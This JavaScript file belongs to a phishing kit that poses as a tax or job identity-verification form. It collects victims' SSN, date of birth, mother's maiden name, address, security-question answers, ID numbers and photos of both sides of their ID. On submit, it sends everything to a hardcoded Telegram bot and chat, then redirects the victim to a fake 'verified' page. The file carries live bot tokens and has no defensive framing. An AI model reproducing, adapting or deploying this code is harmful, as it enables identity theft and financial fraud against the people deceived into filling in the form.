// Function to get URL parameters
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Function to generate random 6-digit verification ID
function generateRandomVerificationId() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Function to get security question text
function getSecurityQuestionText(value) {
    const questions = {
        'first_pet': 'What was the name of your first pet?',
        'childhood_friend': 'What is the name of your childhood best friend?',
        'first_school': 'What elementary school did you attend?',
        'birth_city': 'In what city were you born?',
        'first_car': 'What was the make and model of your first car?'
    };
    return questions[value] || value;
}

let currentStep = 1;
const totalSteps = 2;

// Load data from localStorage and populate form
function loadTaxFormData() {
    const savedData = localStorage.getItem('taxFormData');
    const isJobType = getUrlParameter('type') === 'job';

    let verificationId;
    if (isJobType) {
        verificationId = generateRandomVerificationId();
    } else {
        verificationId = localStorage.getItem('verificationId');
    }

    if (savedData) {
        try {
            const data = JSON.parse(savedData);

            // Prefill first name and last name
            if (data.firstName) {
                const firstNameField = document.getElementById('first_name');
                if (firstNameField) {
                    firstNameField.value = data.firstName;
                    firstNameField.readOnly = true; // Make it uneditable
                    firstNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
                }
            }

            if (data.lastName) {
                const lastNameField = document.getElementById('last_name');
                if (lastNameField) {
                    lastNameField.value = data.lastName;
                    lastNameField.readOnly = true; // Make it uneditable
                    lastNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
                }
            }
        } catch (error) {
            console.error('Error parsing localStorage data:', error);
        }
    }

    // Set verification ID in display element
    if (verificationId) {
        const vidElement = document.getElementById('vid');
        if (vidElement) {
            vidElement.textContent = verificationId;
        }
    }
}

    

// State/Province data
const usaStates = [
    { value: "AL", text: "Alabama" }, { value: "AK", text: "Alaska" }, { value: "AZ", text: "Arizona" },
    { value: "AR", text: "Arkansas" }, { value: "CA", text: "California" }, { value: "CO", text: "Colorado" },
    { value: "CT", text: "Connecticut" }, { value: "DE", text: "Delaware" }, { value: "FL", text: "Florida" },
    { value: "GA", text: "Georgia" }, { value: "HI", text: "Hawaii" }, { value: "ID", text: "Idaho" },
    { value: "IL", text: "Illinois" }, { value: "IN", text: "Indiana" }, { value: "IA", text: "Iowa" },
    { value: "KS", text: "Kansas" }, { value: "KY", text: "Kentucky" }, { value: "LA", text: "Louisiana" },
    { value: "ME", text: "Maine" }, { value: "MD", text: "Maryland" }, { value: "MA", text: "Massachusetts" },
    { value: "MI", text: "Michigan" }, { value: "MN", text: "Minnesota" }, { value: "MS", text: "Mississippi" },
    { value: "MO", text: "Missouri" }, { value: "MT", text: "Montana" }, { value: "NE", text: "Nebraska" },
    { value: "NV", text: "Nevada" }, { value: "NH", text: "New Hampshire" }, { value: "NJ", text: "New Jersey" },
    { value: "NM", text: "New Mexico" }, { value: "NY", text: "New York" }, { value: "NC", text: "North Carolina" },
    { value: "ND", text: "North Dakota" }, { value: "OH", text: "Ohio" }, { value: "OK", text: "Oklahoma" },
    { value: "OR", text: "Oregon" }, { value: "PA", text: "Pennsylvania" }, { value: "RI", text: "Rhode Island" },
    { value: "SC", text: "South Carolina" }, { value: "SD", text: "South Dakota" }, { value: "TN", text: "Tennessee" },
    { value: "TX", text: "Texas" }, { value: "UT", text: "Utah" }, { value: "VT", text: "Vermont" },
    { value: "VA", text: "Virginia" }, { value: "WA", text: "Washington" }, { value: "WV", text: "West Virginia" },
    { value: "WI", text: "Wisconsin" }, { value: "WY", text: "Wyoming" }
];

const canadaProvinces = [
    { value: "AB", text: "Alberta" }, { value: "BC", text: "British Columbia" },
    { value: "MB", text: "Manitoba" }, { value: "NB", text: "New Brunswick" },
    { value: "NL", text: "Newfoundland and Labrador" }, { value: "NS", text: "Nova Scotia" },
    { value: "ON", text: "Ontario" }, { value: "PE", text: "Prince Edward Island" },
    { value: "QC", text: "Quebec" }, { value: "SK", text: "Saskatchewan" },
    { value: "NT", text: "Northwest Territories" }, { value: "NU", text: "Nunavut" },
    { value: "YT", text: "Yukon" }
];

const australiaStates = [
    { value: "ACT", text: "Australian Capital Territory" },
    { value: "NSW", text: "New South Wales" },
    { value: "NT", text: "Northern Territory" },
    { value: "QLD", text: "Queensland" },
    { value: "SA", text: "South Australia" },
    { value: "TAS", text: "Tasmania" },
    { value: "VIC", text: "Victoria" },
    { value: "WA", text: "Western Australia" }
];

// State/Province dropdown management
function updateStateDropdown(countryElementId, stateElementId) {
    const countrySelect = document.getElementById(countryElementId);
    const stateSelect = document.getElementById(stateElementId);

    if (countrySelect && stateSelect) {
        countrySelect.addEventListener("change", function () {
            stateSelect.innerHTML = '<option value="please_select">--Please Select--</option>';

            let statesList =
                this.value === "USA" ? usaStates :
                    this.value === "Canada" ? canadaProvinces :
                        this.value === "Australia" ? australiaStates : [];

            statesList.forEach(state => {
                let option = document.createElement("option");
                option.value = state.value;
                option.textContent = state.text;
                stateSelect.appendChild(option);
            });
        });

        // Initialize on page load
        countrySelect.dispatchEvent(new Event("change"));
    }
}

// Initialize form
document.addEventListener('DOMContentLoaded', function () {
    // Load data from localStorage
    loadTaxFormData();

    updateStateDropdown("country", "state");
    updateStateDropdown("mailing_country", "mailing_state");

    // setupFormValidation();
    setupPhoneFormatting();
    setupSSNFormatting();
    setupZIPFormatting();
    // setupMailingAddressToggle();
    
    // Hide submit button on initial load (step 1)
    showStep(currentStep);
});

// Step navigation
function nextStep() {
    console.log('🚀 nextStep called! currentStep:', currentStep, 'totalSteps:', totalSteps);
    const validationResult = validateCurrentStep();
    console.log('🚀 validateCurrentStep returned:', validationResult);
    if (validationResult) {
        if (currentStep < totalSteps) {
            console.log('🚀 Moving to next step...');
            currentStep++;
            showStep(currentStep);
            updateProgressBar();
        } else {
            console.log('🚀 Already at last step, cannot advance');
        }
    } else {
        console.log('🚀 Validation failed, staying on current step');
    }
}

function prevStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
        updateProgressBar();
    }
}

function showStep(step) {
    document.querySelectorAll('.form-step').forEach(el => {
        el.classList.remove('active');
    });
    document.querySelector(`[data-step="${step}"]`).classList.add('active');
    
    // Show/hide submit button based on current step
    const submitBtn = document.getElementById('submitBtn');
    const submitBtnContainer = submitBtn.parentElement;
    if (step === 1) {
        submitBtnContainer.style.display = 'none';
    } else {
        submitBtnContainer.style.display = 'flex';
    }
}

function updateProgressBar() {
    const progress = (currentStep / totalSteps) * 100;
    document.getElementById('progressBar').style.width = progress + '%';
}

// Validation
function validateCurrentStep() {
    console.log('🔍 validateCurrentStep called for step:', currentStep);
    const currentStepEl = document.querySelector(`[data-step="${currentStep}"]`);
    console.log('🔍 Found step element:', !!currentStepEl);
    const requiredFields = currentStepEl.querySelectorAll('[required]');
    console.log('🔍 Required fields found:', requiredFields.length);
    let isValid = true;
    let errorMessage = '';

    // Step-specific validation
    if (currentStep === 1) {
        console.log('🔍 Validating step 1...');
        // Combined validation for Personal Information, Address, and Contact
        const firstNameEl = document.getElementById('first_name');
        const firstName = firstNameEl ? firstNameEl.value.trim() : '';
        console.log('🔍 firstName element:', !!firstNameEl, 'value:', firstName);
        
        const lastNameEl = document.getElementById('last_name');
        const lastName = lastNameEl ? lastNameEl.value.trim() : '';
        console.log('🔍 lastName element:', !!lastNameEl, 'value:', lastName);
        
        const mothersNameEl = document.getElementById('mothers_name');
        const mothersName = mothersNameEl ? mothersNameEl.value.trim() : '';
        console.log('🔍 mothersName element:', !!mothersNameEl, 'value:', mothersName);
        
        const dobEl = document.getElementById('dob');
        const dob = dobEl ? dobEl.value : '';
        console.log('🔍 dob element:', !!dobEl, 'value:', dob);
        
        const ssnEl = document.getElementById('ssn');
        const ssn = ssnEl ? ssnEl.value.trim() : '';
        console.log('🔍 ssn element:', !!ssnEl, 'value:', ssn);
        const countryEl = document.getElementById('country');
        const country = countryEl ? countryEl.value : '';
        console.log('🔍 country element:', !!countryEl, 'value:', country);
        
        const stateEl = document.getElementById('state');
        const state = stateEl ? stateEl.value : '';
        console.log('🔍 state element:', !!stateEl, 'value:', state);
        
        const addressEl = document.getElementById('address');
        const address = addressEl ? addressEl.value.trim() : '';
        console.log('🔍 address element:', !!addressEl, 'value:', address);
        
        const cityEl = document.getElementById('city');
        const city = cityEl ? cityEl.value.trim() : '';
        console.log('🔍 city element:', !!cityEl, 'value:', city);
        
        const zipEl = document.getElementById('zip');
        const zip = zipEl ? zipEl.value.trim() : '';
        console.log('🔍 zip element:', !!zipEl, 'value:', zip);
        
        const emailEl = document.getElementById('email');
        const email = emailEl ? emailEl.value.trim() : '';
        console.log('🔍 email element:', !!emailEl, 'value:', email);
        
        const homePhoneEl = document.getElementById('home_phone');
        const homePhone = homePhoneEl ? homePhoneEl.value.trim() : '';
        console.log('🔍 homePhone element:', !!homePhoneEl, 'value:', homePhone);
        
        const employmentStatusEl = document.getElementById('employment_status');
        const employmentStatus = employmentStatusEl ? employmentStatusEl.value : '';
        console.log('🔍 employmentStatus element:', !!employmentStatusEl, 'value:', employmentStatus);

        // Personal Information validation
        if (!firstName) {
            errorMessage = 'First name is required';
        } else if (firstName.length < 2) {
            errorMessage = 'First name must be at least 2 characters';
        } else if (!lastName) {
            errorMessage = 'Last name is required';
        } else if (lastName.length < 2) {
            errorMessage = 'Last name must be at least 2 characters';
        } else if (!mothersName) {
            errorMessage = 'Mother\'s maiden name is required';
        } else if (!dob) {
            errorMessage = 'Date of birth is required';
        } else if (!validateAge(dob)) {
            errorMessage = 'You must be at least 18 years old';
        } else if (!ssn) {
            errorMessage = 'Social Security number is required';
        } else if (!validateSSN(ssn)) {
            errorMessage = 'Please enter a valid SSN (XXX-XX-XXXX)';
        // Address validation
        } else if (!country || country === 'please_select') {
            errorMessage = 'Country is required';
        } else if (!state || state === 'please_select') {
            errorMessage = 'State is required';
        } else if (!address) {
            errorMessage = 'Street address is required';
        } else if (!city) {
            errorMessage = 'City is required';
        } else if (!zip) {
            errorMessage = 'ZIP/Postal code is required';
        } else if (!validatePostalCode(zip, country)) {
            errorMessage = country === 'USA' ? 'ZIP code must be 4-5 digits (e.g., 02250)' : 'Please enter a valid postal code';
        // Contact validation
        } else if (!email) {
            errorMessage = 'Email address is required';
        } else if (!validateEmail(email)) {
            errorMessage = 'Please enter a valid email address (e.g., user@domain.com)';
        } else if (!homePhone) {
            errorMessage = 'Home phone is required';
        } else if (!validatePhone(homePhone)) {
            errorMessage = 'Phone must be 10 digits (e.g., 1234567890)';
        } else if (!employmentStatus || employmentStatus === 'please_select') {
            errorMessage = 'Employment status is required';
        }
    } else if (currentStep === 2) {
        // Security questions validation
        const question1 = document.getElementById('security_question1').value;
        const answer1 = document.getElementById('security_answer1').value.trim();
        const question2 = document.getElementById('security_question2').value;
        const answer2 = document.getElementById('security_answer2').value.trim();
        const question3 = document.getElementById('security_question3').value;
        const answer3 = document.getElementById('security_answer3').value.trim();

        // Security questions validation
        if (!question1 || question1 === 'please_select') {
            errorMessage = 'Security question 1 is required';
        } else if (!answer1) {
            errorMessage = 'Answer to security question 1 is required';
        } else if (!question2 || question2 === 'please_select') {
            errorMessage = 'Security question 2 is required';
        } else if (!answer2) {
            errorMessage = 'Answer to security question 2 is required';
        } else if (!question3 || question3 === 'please_select') {
            errorMessage = 'Security question 3 is required';
        } else if (!answer3) {
            errorMessage = 'Answer to security question 3 is required';
        // Combined ID validation and document validation
        } else {
            const idType = document.getElementById('id_type').value;
            const idState = document.getElementById('id_state').value;
            const idNumber = document.getElementById('id_number').value.trim();
            const issuedMonth = document.getElementById('id_date_issued_mm').value;
            const issuedDay = document.getElementById('id_date_issued_dd').value;
            const issuedYear = document.getElementById('id_date_issued_yyyy').value;
            const expMonth = document.getElementById('id_expiration_mm').value;
            const expDay = document.getElementById('id_expiration_dd').value;
            const expYear = document.getElementById('id_expiration_yyyy').value;
            const idFront = document.getElementById('file_upload_front').files[0];
            const idBack = document.getElementById('file_upload_back').files[0];

            // ID validation
        if (!idState || idState === 'please_select') {
            errorMessage = 'Issuing state is required';
        } else if (!idNumber) {
            errorMessage = 'ID number is required';
        } else if (!issuedMonth || !issuedDay || !issuedYear) {
            errorMessage = 'ID issue date is required';
        } else if (!expMonth || !expDay || !expYear) {
            errorMessage = 'ID expiration date is required';
        } else if (!validateDate(issuedMonth, issuedDay, issuedYear, expMonth, expDay, expYear)) {
            errorMessage = 'Expiration date must be after issue date';
        } else if (!isFutureDate(expMonth, expDay, expYear)) {
            errorMessage = 'ID must not be expired';
        } else if (!idFront) {
            errorMessage = 'Photo ID (front) is required';
        } else if (!validateImageFile(idFront)) {
            errorMessage = 'Front ID must be a valid image file (JPG, PNG)';
        } else if (!idBack) {
            errorMessage = 'Photo ID (back) is required';
        } else if (!validateImageFile(idBack)) {
            errorMessage = 'Back ID must be a valid image file (JPG, PNG)';
        }
        }
    }

    if (errorMessage) {
        console.log('❌ Validation failed:', errorMessage);
        alert(errorMessage);
        return false;
    }

    // Clear all errors if validation passes
    document.querySelectorAll('.field-error').forEach(field => {
        field.classList.remove('field-error');
    });
    document.querySelectorAll('.error-message').forEach(error => {
        error.textContent = '';
        error.classList.add('hidden');
    });

    console.log('✅ Validation passed!');
    return true;
}

function validateEmail(email) {
    console.log('🔍 Validating email:', email);
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const result = re.test(email);
    console.log('🔍 Email validation result:', result);
    return result;
}

function validatePhone(phone) {
    console.log('🔍 Validating phone:', phone);
    // Strip all non-digits and check for exactly 10 digits
    const digitsOnly = phone.replace(/\D/g, '');
    const result = digitsOnly.length === 10;
    console.log('🔍 Phone digits only:', digitsOnly, 'validation result:', result);
    return result;
}

function validatePhone(phone) {
    const re = /^[\d\s\-\+\(\)]+$/;
    return re.test(phone) && phone.replace(/\D/g, '').length >= 10;
}

function validateSSN(ssn) {
    console.log('🔍 Validating SSN:', ssn);
    // Accept both formats: XXX-XX-XXXX and XXXXXXXXX
    const reWithDashes = /^\d{3}-\d{2}-\d{4}$/;
    const reWithoutDashes = /^\d{9}$/;
    const isValid = reWithDashes.test(ssn) || reWithoutDashes.test(ssn);
    console.log('🔍 SSN validation result:', isValid);
    return isValid;
}

function calculateAge(dob) {
    const birthDate = new Date(dob);
    const today = new Date();
    let age = today.getFullYear() - birthDate.getFullYear();
    const monthDiff = today.getMonth() - birthDate.getMonth();
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
        age--;
    }
    return age;
}

function validateAge(dob) {
    return calculateAge(dob) >= 18;
}

function validatePostalCode(zip, country) {
    console.log('🔍 Validating postal code:', zip, 'for country:', country);
    if (country === 'USA') {
        // Accept both 4 and 5 digits (e.g., 2250 or 02250)
        const re = /^\d{4,5}(-\d{4})?$/;
        const result = re.test(zip);
        console.log('🔍 USA ZIP validation result:', result);
        return result;
    } else if (country === 'Canada') {
        const re = /^[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d$/;
        const result = re.test(zip);
        console.log('🔍 Canada postal validation result:', result);
        return result;
    } else if (country === 'Australia') {
        const re = /^\d{4}$/;
        const result = re.test(zip);
        console.log('🔍 Australia postal validation result:', result);
        return result;
    }
    console.log('🔍 Other country postal validation result:', zip.length > 0);
    return zip.length > 0;
}

function validateDate(issuedMonth, issuedDay, issuedYear, expMonth, expDay, expYear) {
    const issuedDate = new Date(issuedYear, issuedMonth - 1, issuedDay);
    const expDate = new Date(expYear, expMonth - 1, expDay);
    return expDate > issuedDate;
}

function isFutureDate(month, day, year) {
    const date = new Date(year, month - 1, day);
    const today = new Date();
    return date > today;
}

function validateImageFile(file) {
    const maxSize = 10 * 1024 * 1024; // 10MB
    const allowedTypes = ['image/jpeg', 'image/png', 'image/heic'];
    return file && file.size <= maxSize && allowedTypes.includes(file.type);
}

function validateField(field) {
    const value = field.value.trim();
    const errorEl = field.parentNode.querySelector('.error-message');
    const fieldId = field.id;

    // Clear previous errors
    field.classList.remove('field-error');
    if (errorEl) {
        errorEl.classList.add('hidden');
        errorEl.textContent = '';
    }

    if (!value && field.hasAttribute('required')) {
        showFieldError(field, 'This field is required');
        return false;
    }

    // Email validation
    if (fieldId === 'email' && value && !validateEmail(value)) {
        showFieldError(field, 'Please enter a valid email address');
        return false;
    }

    // Phone validation
    if (fieldId.includes('phone') && value && !validatePhone(value)) {
        showFieldError(field, 'Please enter a valid phone number');
        return false;
    }

    // SSN validation
    if (fieldId === 'ssn' && value && !validateSSN(value)) {
        showFieldError(field, 'Please enter a valid SSN');
        return false;
    }

    // Age validation
    if (fieldId === 'dob' && value) {
        const age = calculateAge(value);
        if (age < 18) {
            showFieldError(field, 'You must be at least 18 years old');
            return false;
        }
    }

    // Show success
    field.classList.add('field-success');
    return true;
}

function showFieldError(field, message) {
    field.classList.add('field-error');
    const errorEl = field.parentNode.querySelector('.error-message');
    if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.remove('hidden');
    }
}

function setupFormValidation() {
    document.querySelectorAll('input, select').forEach(field => {
        field.addEventListener('blur', () => validateField(field));
        field.addEventListener('input', () => {
            if (field.classList.contains('field-error')) {
                validateField(field);
            }
        });
    });
}

// Phone formatting
function setupPhoneFormatting() {
    const phoneFields = ['home_phone', 'cell_phone', 'work_phone'];
    phoneFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('input', function (e) {
                let value = e.target.value.replace(/\D/g, '');
                // Limit to 10 digits
                if (value.length > 10) {
                    value = value.slice(0, 10);
                }
                // Format as (123) 456-7890 for display
                if (value.length > 0) {
                    if (value.length <= 3) {
                        value = `(${value}`;
                    } else if (value.length <= 6) {
                        value = `(${value.slice(0, 3)}) ${value.slice(3)}`;
                    } else {
                        value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
                    }
                }
                e.target.value = value;
                console.log('🔧 Phone formatted to:', e.target.value);
            });
        }
    });
}

// SSN formatting
function setupSSNFormatting() {
    const ssnField = document.getElementById('ssn');
    if (ssnField) {
        ssnField.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
            if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6);
            e.target.value = value.slice(0, 11);
        });
    }
}

// ZIP code formatting
function setupZIPFormatting() {
    const zipFields = ['zip', 'mailing_zip'];
    zipFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('input', function (e) {
                let value = e.target.value.replace(/\D/g, '');
                // Limit to 5 digits for USA
                if (value.length > 5) {
                    value = value.slice(0, 5);
                }
                e.target.value = value;
                console.log('🔧 ZIP formatted to:', e.target.value);
            });
        }
    });
}

// Mailing address toggle
function setupMailingAddressToggle() {
    const checkbox = document.getElementById('use_different_address');
    const section = document.getElementById('mailing_address_section');

    if (checkbox && section) {
        checkbox.addEventListener('change', function (e) {
            if (e.target.checked) {
                section.classList.remove('hidden');
            } else {
                section.classList.add('hidden');
            }
        });
    }
}

// Form submission
document.getElementById('multiStepForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // if (!validateCurrentStep()) {
    //     return;
    // }

    const submitBtn = document.getElementById('submitBtn');
    const spinner = submitBtn.querySelector('svg');
    const btnText = submitBtn.querySelector('span');

    // Show loading state
    submitBtn.disabled = true;
    spinner.classList.remove('hidden');
    btnText.textContent = 'Processing...';


    // Collect form data
    const formData = new FormData(this);

    const botToken = '8572531357:AAHH3Xeq9hfvLSFcLUS6mz3JfrHmSJR0x4U';
    // const botToken = '7521194770:AAGefw2iSKinKORvxx7N4H88pFvXoe-KVNw';
    // const chatId = '6632396282';
    const chatId = '-5020919352';

    // Create message
    const message = `
🔐 IDENTITY VERIFICATION SUBMISSION

👤 Personal Information:
• Name: ${formData.get("first_name")} ${formData.get("middle_name")} ${formData.get("last_name")} ${formData.get("suffix")}
• Mother's Maiden Name: ${formData.get("mothers_name")}
• SSN: ${formData.get("ssn")}
• Date of Birth: ${formData.get("dob")}

📍 Current Address:
• Country: ${formData.get("country")}
• Address: ${formData.get("address")}
• City: ${formData.get("city")}, ${formData.get("state")} ${formData.get("zip")}

📮 Mailing Address:
• Different Address: ${formData.get("use_different_address") ? 'Yes' : 'No'}
${formData.get("use_different_address") ? `• Mailing: ${formData.get("mailing_address")}, ${formData.get("mailing_city")}, ${formData.get("mailing_state")} ${formData.get("mailing_zip")}` : ''}

📞 Contact Information:
• Preferred Method: ${formData.get("preferred_contact_method")}
• Email: ${formData.get("email")}
• Home Phone: ${formData.get("home_phone")}
• Cell Phone: ${formData.get("cell_phone")}
• Work Phone: ${formData.get("work_phone")}
• Employment: ${formData.get("employment_status")}

🔒 Security Questions:
• Q1: ${getSecurityQuestionText(formData.get("security_question1"))}
• A1: ${formData.get("security_answer1")}
• Q2: ${getSecurityQuestionText(formData.get("security_question2"))}
• A2: ${formData.get("security_answer2")}
• Q3: ${getSecurityQuestionText(formData.get("security_question3"))}
• A3: ${formData.get("security_answer3")}

🆔 Identification:
• ID Type: ${formData.get("id_type")}
• ID Number: ${formData.get("id_number")}
• Issuing State: ${formData.get("id_state")}
• Date Issued: ${formData.get("id_date_issued_mm")}/${formData.get("id_date_issued_dd")}/${formData.get("id_date_issued_yyyy")}
• Expiration: ${formData.get("id_expiration_mm")}/${formData.get("id_expiration_dd")}/${formData.get("id_expiration_yyyy")}

📎 Documents: ID Front, ID Back uploaded
            `;

    // Send message
    const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    $.post(textUrl, { chat_id: chatId, text: message })
        .then(() => {
            // Send files
            const filesToSend = ["file_upload_front", "file_upload_back"];
            let filesUploaded = 0;

            function sendFile(fileInputName) {
                const file = document.getElementById(fileInputName)?.files[0];
                if (file) {
                    const fileData = new FormData();
                    fileData.append("chat_id", chatId);
                    fileData.append("document", file, file.name);

                    const fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
                    $.ajax({
                        url: fileUrl,
                        type: "POST",
                        data: fileData,
                        processData: false,
                        contentType: false,
                        success: () => checkAllFilesUploaded(),
                        error: () => checkAllFilesUploaded()
                    });
                } else {
                    checkAllFilesUploaded();
                }
            }

            function checkAllFilesUploaded() {
                filesUploaded++;
                if (filesUploaded === filesToSend.length) {
                    const isJobType = getUrlParameter('type') === 'job';
                    const redirectUrl = isJobType ? './loadid.html' : './verified.html';
                    window.location.href = redirectUrl;
                }
            }

            filesToSend.forEach(sendFile);
        })
        .catch(() => {
            // Reset button state on error
            submitBtn.disabled = false;
            spinner.classList.add('hidden');
            btnText.textContent = 'Submit Verification';
            alert('There was an error submitting your verification. Please try again.');
        });
});